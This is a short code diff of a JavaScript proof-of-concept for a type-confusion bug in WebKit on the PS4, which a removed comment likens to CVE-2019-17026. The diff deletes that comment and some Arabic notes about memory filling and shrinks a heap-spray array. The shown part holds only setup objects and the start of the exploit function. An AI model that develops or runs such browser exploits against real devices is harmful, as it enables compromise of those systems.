@@ -45,15 +45,24 @@ function main() {
 main();
 */
 
-// Advanced POC for CVE-2019-17026-like Type Confusion in WebKit on PS4 10.xx
+
+
+
+
+
+
+
+
+
+
 const NUM_ITERATIONS = 10;
-const ARRAY_LENGTH = 1000; // زيادة الحجم لزيادة احتمال التداخل
+const ARRAY_LENGTH = 1000; 
 
 let OBJ = { a: 41 };
 OBJ.a = 42;
 let TARGET = { secret: 0x12345678, extra: 0x87654321 };
 let OTHER = { value: 0xdeadbeef };
-let BUFFER = new Array(1000000); // مصفوفة كبيرة لملء الذاكرة
+let BUFFER = new Array(10000); // 
 
 function f(obj, idx, targetAddr) {
     let v = OBJ.a;
